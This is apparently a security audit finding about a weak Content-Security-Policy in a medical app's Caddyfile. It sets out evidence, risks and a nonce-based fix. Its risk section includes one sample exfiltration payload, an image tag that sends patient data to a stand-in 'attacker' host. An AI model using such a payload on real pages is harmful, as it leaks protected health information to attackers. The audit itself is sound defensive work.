---
id: A07-P2-002
title: Caddy CSP includes 'unsafe-inline' and 'unsafe-eval'
severity: P2
domain: infrastructure-opsec
date: 2026-05-04
---

## Issue

The MODE B CSP header in `Caddyfile` is enforced (Phase 19 turned off
`-Report-Only`) but allows both `'unsafe-inline'` and `'unsafe-eval'`
in `script-src`, plus `'unsafe-inline'` in `style-src`. This is the
weakest enforced-CSP posture short of disabling CSP altogether — every
inline `<script>` and every `eval()` / `new Function()` can run. The
comment in the Caddyfile attributes this to "Next 16 + Tailwind inline
emission" — a real constraint, but typically solvable with nonces or
hashes.

## Evidence

```
$ grep -A1 'Content-Security-Policy "' /opt/meddoc-pro/Caddyfile
        Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' https://*.ingest.sentry.io; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; object-src 'none';"
```

`-Server` is correctly removed; HSTS preload + max-age=31536000 is set;
`X-Content-Type-Options nosniff`, `X-Frame-Options SAMEORIGIN`,
`Referrer-Policy strict-origin-when-cross-origin`, and a tight
`Permissions-Policy` are all in place. The CSP weakness is the gap.

## Risk

- A reflected/stored XSS vector in any of the Next.js apps becomes
  trivially weaponisable when the CSP allows inline scripts and eval.
  HSTS + cookie protections do not stop in-page XSS.
- HIPAA §164.312(c) "Integrity" indirectly: a successful XSS in a doctor
  session can read the SOAP draft from the page DOM and exfiltrate to an
  attacker-controlled domain. CSP `connect-src 'self' https://*.ingest.sentry.io`
  prevents direct fetch exfiltration, but `<img src=//attacker/?phi=...>`
  sneaks through `img-src https:`.

## Recommended fix

Move to a nonce-based CSP. Next 16's `next.config.js` has nonce-emission
support; configure Caddy to emit a per-request nonce header (or generate
nonce in the app and pass through). Sketch:

1. Generate nonce in the Next.js middleware (already a server-rendered
   environment).
2. Set `Content-Security-Policy: ... script-src 'self' 'nonce-{NONCE}' 'strict-dynamic'; ...`
   from the app side, drop the Caddy-side `Content-Security-Policy` header
   for that route.
3. Mark all inline scripts with `nonce={NONCE}` and remove `unsafe-eval`
   by audit (Tailwind JIT historically used eval; current 4.x does not).
4. Verify with `https://csp-evaluator.withgoogle.com/`.

Until nonces are deployed, tighten what we can:
- Drop `'unsafe-eval'` first (lowest blast radius to remove — inspect
  bundle for eval/new Function calls and refactor).
- Tighten `img-src` from `https:` to `'self' data: blob:` only (no PHI
  feature requires arbitrary-host images today).
- Add `report-uri` / `report-to` so future violations are observable.

This is a P2 because the rest of the security headers are in good shape;
treat as a tightening rather than a hole.
